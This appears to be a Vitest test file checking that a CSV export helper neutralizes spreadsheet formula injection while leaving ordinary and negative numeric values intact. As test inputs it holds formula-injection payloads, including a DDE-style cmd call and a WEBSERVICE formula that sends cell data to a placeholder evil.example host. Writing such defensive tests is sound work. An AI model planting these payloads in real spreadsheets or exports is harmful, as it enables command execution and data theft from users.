import { describe, expect, it } from "vitest";

import { buildCsv, neutralizeCsvFormula } from "@/lib/csv";

describe("CSV export escaping", () => {
  it("neutralizes spreadsheet formula injection", () => {
    expect(neutralizeCsvFormula("=1+1")).toBe("'=1+1");
    expect(neutralizeCsvFormula("+cmd|'/C calc'!A0")).toBe(
      "'+cmd|'/C calc'!A0",
    );
    expect(neutralizeCsvFormula("@SUM(A1:A2)")).toBe("'@SUM(A1:A2)");
    expect(neutralizeCsvFormula("-2+3+cmd")).toBe("'-2+3+cmd");
    expect(neutralizeCsvFormula("=HYPERLINK(\"https://evil.example\")")).toBe(
      "'=HYPERLINK(\"https://evil.example\")",
    );
  });

  it("keeps values that are not formulas untouched", () => {
    expect(neutralizeCsvFormula("Roof repair quote")).toBe("Roof repair quote");
    expect(neutralizeCsvFormula("taylor@example.com")).toBe(
      "taylor@example.com",
    );
    expect(neutralizeCsvFormula("")).toBe("");
  });

  it("keeps genuinely numeric values numeric", () => {
    // A negative money amount must stay a number, not become text.
    expect(neutralizeCsvFormula("-12.50")).toBe("-12.50");
    expect(neutralizeCsvFormula("1500")).toBe("1500");
  });

  it("escapes a formula-leading customer field in the built CSV", () => {
    const csv = buildCsv(
      [{ header: "details", render: (row: { details: string }) => row.details }],
      [{ details: '=WEBSERVICE("http://evil.example/?d="&A1)' }],
    );

    expect(csv).toContain("'=WEBSERVICE");
    // The raw formula must never reach the file unescaped.
    expect(csv).not.toContain(",=WEBSERVICE");
  });

  it("still quotes commas, quotes, and newlines", () => {
    const csv = buildCsv(
      [
        {
          header: "customer_name",
          render: (row: { name: string }) => row.name,
        },
      ],
      [{ name: 'Say "hi", please\nthanks' }],
    );

    expect(csv).toContain('"Say ""hi"", please\nthanks"');
  });
});
